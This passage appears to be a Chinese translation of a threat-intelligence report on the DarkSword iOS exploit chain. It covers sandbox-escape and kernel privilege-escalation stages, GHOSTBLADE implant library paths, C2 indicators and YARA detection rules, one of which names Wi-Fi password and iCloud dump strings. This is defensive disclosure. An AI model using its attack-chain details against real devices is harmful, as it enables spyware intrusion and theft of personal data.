在 Safari 浏览器中，GPU 进程的权限高于 WebContent 沙箱，但仍然无法访问系统的大部分其他资源。为了绕过这一限制，DarkSword 利用了另一个沙箱逃逸漏洞，sbx1_main.js即 CVE-2025-43510，这是一个 XNU 中的内存管理漏洞。这是一个写时复制 (copy-on-write) 漏洞，攻击者利用该漏洞在系统服务中构建任意函数调用原语mediaplaybackd。该系统服务拥有比 Safari GPU 进程更大的权限，攻击者可以在其中运行所需的最终漏洞利用程序。他们通过将 JavaScriptCore 运行时的副本加载到该mediaplaybackd进程中，并在其中执行下一阶段的漏洞利用程序来实现这一点。  
  
苹果公司在 iOS 18.7.2 和 26.1 版本中修复了此漏洞。  
# 本地权限升级和最终有效载荷  
  
最后，该漏洞利用程序加载了最后一个模块pe_main.js。该模块利用了 CVE-2025-43520 漏洞，即 XNU 虚拟文件系统 (VFS) 实现中的一个内核模式竞争条件漏洞，该漏洞可被利用来构建物理内存和虚拟内存的读写原语。苹果公司已在 iOS 18.7.2 和 26.1 版本中修复了此漏洞。  
  
该漏洞利用程序包含一系列基于其基本函数构建的库类，这些基本函数被不同的后渗透有效载荷所使用，例如Native，提供用于操作原始内存和调用本地函数的抽象层，以及FileUtils提供类似 POSIX 文件系统 API 的库。对所分析的 GHOSTBLADE 样本应用 Webpack 处理后留下的痕迹包括文件路径，这些路径显示了这些库在磁盘上的结构（图 22）。  
  
我们根据编码风格的一致性以及与库代码的紧密集成（这与 GHOSTKNIFE 和 GHOSTSABER 使用这些库的方式明显不同），判断 GHOSTBLADE 很可能是由 DarkSword 的开发者开发的。此外，我们还观察到，在 PARS Defense 提供的样本中，一些后渗透有效载荷库被进行了额外的修改，包括对原始内存缓冲区的额外操作，这些操作很可能用于后续的二进制模块。另外，GHOSTBLADE 的库中包含一个对startSandworm()未实现函数的引用；我们怀疑这可能是另一个漏洞利用程序的代号。  
  
src/InjectJS.js  
  
src/libs/Chain/Chain.js  
  
src/libs/Chain/Native.js  
  
src/libs/Chain/OffsetsStruct.js  
  
src/libs/Driver/Driver.js  
  
src/libs/Driver/DriverNewThread.js  
  
src/libs/Driver/Offsets.js  
  
src/libs/Driver/OffsetsTable.js  
  
src/libs/JSUtils/FileUtils.js  
  
src/libs/JSUtils/Logger.js  
  
src/libs/JSUtils/Utils.js  
  
src/libs/TaskRop/Exception.js  
  
src/libs/TaskRop/ExceptionMessageStruct.js  
  
src/libs/TaskRop/ExceptionReplyStruct.js  
  
src/libs/TaskRop/MachMsgHeaderStruct.js  
  
src/libs/TaskRop/PAC.js  
  
src/libs/TaskRop/PortRightInserter.js  
  
src/libs/TaskRop/RegistersStruct.js  
  
src/libs/TaskRop/RemoteCall.js  
  
src/libs/TaskRop/Sandbox.js  
  
src/libs/TaskRop/SelfTaskStruct.js  
  
src/libs/TaskRop/Task.js  
  
src/libs/TaskRop/TaskRop.js  
  
src/libs/TaskRop/Thread.js  
  
src/libs/TaskRop/ThreadState.js  
  
src/libs/TaskRop/VM.js  
  
src/libs/TaskRop/VmMapEntry.js  
  
src/libs/TaskRop/VMObject.js  
  
src/libs/TaskRop/VmPackingParams.js  
  
src/libs/TaskRop/VMShmem.js  
  
src/loader.js  
  
src/main.js  
  
src/MigFilterBypassThread.js  
  
图 22：GHOSTBLADE 示例中的文件路径痕迹  
# 展望与启示  
  
DarkSword 和 Coruna 被各种行为者使用，表明不同地域和动机的行为者之间持续存在利用漏洞扩散的风险。谷歌始终致力于协助缓解这一问题，部分途径是通过我们持续参与的“。该进程旨在凝聚共识，推动减少间谍软件行业造成的危害。我们共同致力于制定国际规范和框架，以限制这些强大技术的滥用，并保护世界各地的人权。这些努力建立在各国政府此前的行动之上，包括美国政府为限制政府使用间谍软件而承诺。  
# IOC  
  
为了帮助更广泛的社区查找和识别本博文中概述的活动，我们已将入侵指标 (IOC) 添加到中，供注册用户使用。我们还将 GHOSTBLADE 的样本上传到了 VirusTotal。  
# 网络指标  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">国际奥委会</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">威胁行为者</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">语境</span></font></font></strong></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">snapshare[.]聊天</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">UNC6748</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">DarkSword在沙特阿拉伯使用送货服务</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">62.72.21[.]10</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">UNC6748</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">GHOSTKNIFE C2 服务器（2025 年 11 月）</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">72.60.98[.]48</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">UNC6748</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">GHOSTKNIFE C2 服务器（2025 年 11 月）</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">sahibndn[.]io</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">PARS 防御</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">DarkSword在土耳其使用配送服务</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">e5.malaymoil[.]com</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">PARS 防御</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">DarkSword在马来西亚提供送货服务</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">static.cdncounter[.]net</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">UNC6353</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">DarkSword 通过乌克兰的酒吧进行配送</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">sqwas.shapelie[.]com</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">UNC6353</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">GHOSTBLADE 渗透服务器</span></font></font></span></p></td></tr></tbody></table># 文件指示器  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">国际奥委会</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">威胁行为者</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">语境</span></font></font></strong></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">2e5a56beb63f21d9347310412ae6efb29fd3db2d3a3fc0798865a29a3c578d35</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">UNC6353</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">提取的 GHOSTBLADE 样本</span></font></font></span></p></td></tr></tbody></table># 检测  
# YARA 规则  
  
rule G_Backdoor_GHOSTKNIFE_1 {  
  
meta:  
  
author = "Google Threat Intelligence Group (GTIG)"  
  
strings:  
  
$ = "server_pub_ex"  
  
$ = "client_pri_ds"  
  
$ = "getfilebyExtention"  
  
$ = "getContOfFilesForModule"  
  
$ = "carPlayConnectionState"  
  
$ = "saveRecordingApp"  
  
$ = "getLastItemBack"  
  
$ = "the inherted class"  
  
$ = "passExtetion"  
  
condition:  
  
filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them  
  
}  
  
rule G_Backdoor_GHOSTSABER_1 {  
  
meta:  
  
author = "Google Threat Intelligence Group (GTIG)"  
  
strings:  
  
$ = "sendDeviceInfoJson"  
  
$ = "merge2AppLists"  
  
$ = "send_command_to_upper_process"  
  
$ = "ChangeStatusCheckSleepInterval"  
  
$ = "SendRegEx"  
  
$ = "evalJsResponse.json"  
  
$ = "sendSimpleUploadJsonObject"  
  
$ = "device_info_all"  
  
$ = "getPayloadForSimpleStatusRequest"  
  
condition:  
  
filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them  
  
}  
  
rule G_Datamine_GHOSTBLADE_1 {  
  
meta:  
  
author = "Google Threat Intelligence Group (GTIG)"  
  
strings:  
  
$ = "/private/var/tmp/wifi_passwords.txt"  
  
$ = "/private/var/tmp/wifi_passwords_securityd.txt"  
  
$ = "/.com.apple.mobile_container_manager.metadata.plist" fullword  
  
$ = "X-Device-UUID: ${"  
  
$ = "/installed_apps.txt" fullword  
  
$ = "icloud_dump_" fullword  
  
condition:  
  
filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 3 of them  
  
}  
  
rule G_Hunting_DarkSwordExploitChain_ImplantLib_FilePaths_1 {  
  
meta:  
  
author = "Google Threat Intelligence Group (GTIG)"  
  
strings:  
  
$ = "src/InjectJS.js"  
  
$ = "src/libs/Chain/Chain.js"  
  
$ = "src/libs/Chain/Native.js"  
  
$ = "src/libs/Chain/OffsetsStruct.js"  
  
$ = "src/libs/Driver/Driver.js"  
  
$ = "src/libs/Driver/DriverNewThread.js"  
  
$ = "src/libs/Driver/Offsets.js"  
  
$ = "src/libs/Driver/OffsetsTable.js"  
  
$ = "src/libs/JSUtils/FileUtils.js"  
  
$ = "src/libs/JSUtils/Logger.js"  
  
$ = "src/libs/JSUtils/Utils.js"  
  
$ = "src/libs/TaskRop/Exception.js"  
  
$ = "src/libs/TaskRop/ExceptionMessageStruct.js"  
  
$ = "src/libs/TaskRop/ExceptionReplyStruct.js"  
  
$ = "src/libs/TaskRop/MachMsgHeaderStruct.js"  
  
$ = "src/libs/TaskRop/PAC.js"  
  
$ = "src/libs/TaskRop/PortRightInserter.js"  
  
$ = "src/libs/TaskRop/RegistersStruct.js"  
  
$ = "src/libs/TaskRop/RemoteCall.js"  
  
$ = "src/libs/TaskRop/Sandbox.js"  
  
$ = "src/libs/TaskRop/SelfTaskStruct.js"  
  
$ = "src/libs/TaskRop/Task.js"  
  
$ = "src/libs/TaskRop/TaskRop.js"  
  
$ = "src/libs/TaskRop/Thread.js"  
  
$ = "src/libs/TaskRop/ThreadState.js"  
  
$ = "src/libs/TaskRop/VM.js"  
  
$ = "src/libs/TaskRop/VmMapEntry.js"  
  
$ = "src/libs/TaskRop/VMObject.js"  
  
$ = "src/libs/TaskRop/VmPackingParams.js"  
  
$ = "src/libs/TaskRop/VMShmem.js"  
  
$ = "src/MigFilterBypassThread.js"  
  
condition:  
  
any of them  
  
}  
  
